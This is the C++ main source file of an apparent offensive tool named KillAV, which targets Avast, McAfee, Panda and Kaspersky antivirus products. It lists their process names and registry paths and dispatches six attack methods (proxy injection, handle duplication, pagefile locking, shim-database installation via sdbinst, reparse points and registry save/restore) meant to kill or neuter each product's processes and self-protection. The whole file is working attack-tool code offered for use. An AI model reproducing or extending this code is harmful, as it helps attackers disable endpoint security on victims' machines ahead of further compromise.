#include "MainHeader.h"

using namespace std;

//AV structures
AV_struct<3> avast_		= { "Avast",		{ L"AvastUI.exe",	L"AvastSvc.exe",L"afwServ.exe"		},	L"AVAST Software\\Avast",		L"ProgramFolder",				true,	L"SYSTEM\\ControlSet001\\Services",		L"aswSP",		L"avastInject.sdb"};
AV_struct<2> mcafee_	= { "McAfee",		{ L"McUICnt.exe",	L"McPltCmd.exe"						},	L"McAfee\\Platform",			L"Install Dir",					true,	L"SYSTEM\\CurrentControlSet\\Services",	L"McAPExe",		L""};
AV_struct<3> Panda_		= { "Panda",		{ L"PSANHost.exe",	L"PSUAService.exe",L"PSUAMain.exe"	},	L"Panda Software\\Setup",		L"Path",						true,	L"",									L"",			L"pandaInject.sdb"};
AV_struct<2> kaspersky_ = { "Kaspersky",	{ L"avp.exe",		L"avpui.exe"						},	L"KasperskyLab\\SetupFolders",	L"KFAKAVKISPURESAAS19.0.0",		true,	L"SYSTEM\\CurrentControlSet\\Services",	L"AVP19.0.0",	L"kasperskyInject.sdb"};
//HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\aswSP
//Main AV_list
wstring av_list[] = { L"Avast", L"McAfee", L"Panda", L"Kaspersky", L"" };
wstring methods[] = { L"ProxyInject", L"DuplicateHandle", L"PageFile", L"ShimEngine", L"ReparsePoint", L"RegSafe", L"" };

int process_name_count = 0;
bool priv_adjust = false;

void PrintHelp()
{
	cout << "Usage:  KillAV [-help][-method] <AV_name>" << endl;
	cout << endl << "Supported methods:" << endl;
	int i = 0;
	while (methods[i] != L"")
	{
		wcout << methods[i] <<  endl;
		i++;
	};
	cout << endl <<  "Supported AV_list:" << endl;
	i = 0;
	while (av_list[i] != L"")
	{
		wcout << av_list[i] << endl;
		i++;
	};


}

int _tmain(int argc, _TCHAR* argv[])
{
	wstring arg;
	wstring av_name;

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // Get handle to standard output
	if (hConsole == NULL)
	{
		cout << "[-] Error in GetStdHandle function" << endl;
		return 0;
	}

	cout << "*********************************************" << endl;
	cout << "* KillAV compilation 2018 v1.0 *" << endl;
	cout << "*********************************************" << endl;

	if (!Heap_init())
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
		cout << "[-] Heap Creating error" << endl;
		CloseHandle(hConsole);
		return 0;
	}

	if (argc < 2 || !wcscmp(argv[1], L"-help"))
	{
		PrintHelp();
		CloseHandle(hConsole);
		Heap_Destroy();
		return 0;
	}
	//parse arg
	arg		= argv[1];
	av_name = argv[2];

	vector <wstring> process_name_array;
	wstring av_sdb_path;
	wstring av_reg_path;
	wstring av_reg_path_subkey;
	wstring av_reg_path_sp;
	wstring av_reg_path_sp_key;
	bool wow64;

	//Check token membership,try to adjust priv
	if (!priv_adjust)
	{
		MainPrivUtil();
		priv_adjust = true;
	}
		
	int r = 0;
	while (av_list[r] != L"")
	{
		if (av_name == av_list[r])
		{
			SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
			wcout << "[*] Attacked antivirus: " << av_list[r] << endl;
			switch (r)
			{
				case 0:
				{
					//avast
					process_name_count = avast_.process_name_count;
					process_name_array.resize(sizeof(avast_.process_name));
					copy(avast_.process_name, avast_.process_name + process_name_count, process_name_array.begin());
					av_reg_path.resize(avast_.reg_path_install.size());
					av_reg_path_subkey.resize(avast_.reg_path_install_subkey.size());
					copy(avast_.reg_path_install_subkey.begin(), avast_.reg_path_install_subkey.end(), av_reg_path_subkey.begin());
					copy(avast_.reg_path_install.begin(), avast_.reg_path_install.end(), av_reg_path.begin());
					wow64 = avast_.wow64_reg;
					av_sdb_path = avast_.sdb_name;
					av_reg_path_sp = avast_.reg_path_sp;
					av_reg_path_sp_key = avast_.reg_path_sp_key;
					break;

				}
				case 1:
				{
					//McAfee
					process_name_count = mcafee_.process_name_count;
					process_name_array.resize(sizeof(mcafee_.process_name));
					copy(mcafee_.process_name, mcafee_.process_name + process_name_count, process_name_array.begin());
					av_reg_path.resize(mcafee_.reg_path_install.size());
					av_reg_path_subkey.resize(mcafee_.reg_path_install_subkey.size());
					copy(mcafee_.reg_path_install_subkey.begin(), mcafee_.reg_path_install_subkey.end(), av_reg_path_subkey.begin());
					copy(mcafee_.reg_path_install.begin(), mcafee_.reg_path_install.end(), av_reg_path.begin());
					wow64 = mcafee_.wow64_reg;
					av_reg_path_sp = mcafee_.reg_path_sp;
					av_reg_path_sp_key = mcafee_.reg_path_sp_key;
					break;
				}
				case 2:
				{
					//Panda
					process_name_count = Panda_.process_name_count;
					process_name_array.resize(sizeof(Panda_.process_name));
					copy(Panda_.process_name, Panda_.process_name + process_name_count, process_name_array.begin());
					av_reg_path.resize(Panda_.reg_path_install.size());
					av_reg_path_subkey.resize(Panda_.reg_path_install_subkey.size());
					copy(Panda_.reg_path_install_subkey.begin(), Panda_.reg_path_install_subkey.end(), av_reg_path_subkey.begin());
					copy(Panda_.reg_path_install.begin(), Panda_.reg_path_install.end(), av_reg_path.begin());
					wow64 = Panda_.wow64_reg;
					av_sdb_path = Panda_.sdb_name;
					av_reg_path_sp = Panda_.reg_path_sp;
					av_reg_path_sp_key = Panda_.reg_path_sp_key;
					break;
				}
				case 3:
				{
					//Kaspersky
					process_name_count = kaspersky_.process_name_count;
					process_name_array.resize(sizeof(kaspersky_.process_name));
					copy(kaspersky_.process_name, kaspersky_.process_name + process_name_count, process_name_array.begin());
					av_reg_path.resize(kaspersky_.reg_path_install.size());
					av_reg_path_subkey.resize(kaspersky_.reg_path_install_subkey.size());
					copy(kaspersky_.reg_path_install_subkey.begin(), kaspersky_.reg_path_install_subkey.end(), av_reg_path_subkey.begin());
					copy(kaspersky_.reg_path_install.begin(), kaspersky_.reg_path_install.end(), av_reg_path.begin());
					wow64 = kaspersky_.wow64_reg;
					av_sdb_path = kaspersky_.sdb_name;
					av_reg_path_sp = kaspersky_.reg_path_sp;
					av_reg_path_sp_key = kaspersky_.reg_path_sp_key;
					break;
				}
			}
		}
		r++;
	}

	vector <unsigned int> array_PID;
	wstring av_install_path;
	wstring image_path;

	if (arg == L"-ProxyInject")
	{
		//Runtime killing
		for (int i = 0; i < process_name_count; i++)
		{
			unsigned int pid_;
			array_PID.resize(0);
			pid_ = EnumProc(process_name_array[i], array_PID);
			//Array of PID's
			if (pid_ != NULL)
			{
				for (unsigned int r = 0; r < array_PID.size(); r++)
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
					wcout << "[+] Found AV_process: " << process_name_array[i] << endl;
					///////////////////////////////
					SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
					///////////////////////////////


					//Grab from registry AV path information
					if (GetAVpath(av_reg_path, av_reg_path_subkey, av_install_path, true))
					{
						image_path = av_install_path + L"\\" + process_name_array[i];
						if (ProxyInjectAttack(image_path, process_name_array[i]))
						{
							SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
							wcout << "[+] Payload injected to spawned AV_process: " << image_path << endl;
						}
						else
						{
							SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
							wcout << "[-] Payload was not injected to spawned AV_process: " << image_path << endl;
						}
					}
				}
			}
		}
	}
	else if (arg == L"-DuplicateHandle")
	{
		//Runtime killing
		for (int i = 0; i < process_name_count; i++)
		{
			unsigned int pid_;
			array_PID.resize(0);
			pid_ = EnumProc(process_name_array[i], array_PID);
			//Array of PID's
			if (pid_ != NULL)
			{
				for (unsigned int r = 0; r < array_PID.size(); r++)
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
					wcout << "[+] Found AV_process: " << process_name_array[i] << endl;
					///////////////////////////////
					SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
					///////////////////////////////

					if (DupHandleAttack(array_PID[r]))
					{
						SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
						wcout << "[+] Success killing AV_process: " << process_name_array[i] << endl;
					}
					else
					{
						SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
						wcout << "[-] Failed killing AV_process: " << process_name_array[i] << endl;
					}
				}
			}
		}
	}
	else if (arg == L"-PageFile")
	{
		//PageLock
		if (GetAVpath(av_reg_path, av_reg_path_subkey, av_install_path, wow64))
		{
			for (int i = 0; i<process_name_count; i++)
			{
				image_path = L"\\??\\" + av_install_path + L"\\" + process_name_array[i] + L".config";
				if (PageLock(image_path))
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
					wcout << "[+] Pagefile created for AV_image: " << image_path << endl;
				}
				else
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
					wcout << "[-] Pagefile not created for AV_image: " << image_path << endl;
				}
			}
		}
	}
	else if (arg == L"-ShimEngine")
	{
		wstring installDB = L"sdbinst.exe " + av_sdb_path;
		_wsystem(installDB.c_str());		//sdbinst.exe  avInject.sdb
	}
	else if (arg == L"-ReparsePoint")	//fsutil reparsepoint delete NAME - to delete reparsepoint
	{
		if (GetAVpath(av_reg_path, av_reg_path_subkey, av_install_path, wow64))
		{
			for (int i = 0; i<process_name_count; i++)
			{
				image_path = av_install_path + L"\\" + process_name_array[i];
				if (ReparsePointAttack(image_path))
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
					wcout << "[+] Reparse point was created to AV_process: " << image_path << endl;
				}
				else
				{
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
					wcout << "[-] Reparse point was not created to AV_process: " << image_path << endl;
				}
			}
		}

	}
	else if (arg == L"-RegSafe")
	{
		if (RegSafe(av_reg_path_sp, av_reg_path_sp_key))
		{
			SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
			wcout << "[+] RegSafe/RegRestore successfully completed for AV_image: " << av_reg_path_sp << L"\\" << av_reg_path_sp_key << endl;
		}
		else
		{
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
			wcout << "[-] RegSafe/RegRestore failed to complete for AV_image: " << av_reg_path_sp << L"\\" << av_reg_path_sp_key << endl;
		}
	}
	else
	{
		SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
		cout << "Invalid command" << endl;
		CloseHandle(hConsole);
		Heap_Destroy();
		return 0;
	}
	SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
	CloseHandle(hConsole);
	Heap_Destroy();
	return 0;

}